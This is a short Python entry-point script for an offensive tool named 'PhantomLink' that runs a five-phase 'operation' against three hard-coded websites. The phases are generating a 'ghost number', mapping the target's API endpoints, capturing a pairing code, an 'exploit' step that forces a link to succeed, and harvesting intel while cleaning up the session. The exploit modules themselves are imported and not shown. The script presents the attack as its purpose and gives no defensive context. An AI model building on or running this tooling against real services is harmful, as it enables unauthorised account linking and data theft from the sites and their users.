import sys
from phantom.number_gen import generate_ghost_number
from phantom.recon import map_target
from phantom.engager import capture_pairing_code
from phantom.exploit import trigger_link_success
from phantom.intel_sink import harvest_and_clean

TARGETS = {
    "zapero": "https://afrivexa.com",
    "waegy": "https://a1.waegy.com",
    "wha7": "https://wha7.org"
}

def main():
    target_key = sys.argv[2] if len(sys.argv) > 2 else "zapero"
    target_url = TARGETS.get(target_key, "https://afrivexa.com")
    print(f"[PhantomLink] Starting operation against {target_url}")

    # Phase 1: Generate ghost number
    ghost_number = generate_ghost_number()
    print(f"[PhantomLink] Ghost number: {ghost_number}")

    # Phase 2: Recon the target (optional, maps API endpoints)
    api_map = map_target(target_url)
    print(f"[PhantomLink] Recon complete. Confirmation endpoint: {api_map.get('confirm_url')}")

    # Phase 3: Engage and capture pairing code
    pairing_code = capture_pairing_code(target_url, ghost_number)
    print(f"[PhantomLink] Pairing code captured: {pairing_code}")

    # Phase 4: Exploit - trigger link success
    result = trigger_link_success(api_map, pairing_code, ghost_number)
    print(f"[PhantomLink] Link status: {result}")

    # Phase 5: Harvest intel and clean session
    harvest_and_clean(ghost_number, result)

    print("[PhantomLink] Operation cycle complete.")

if __name__ == "__main__":
    main()
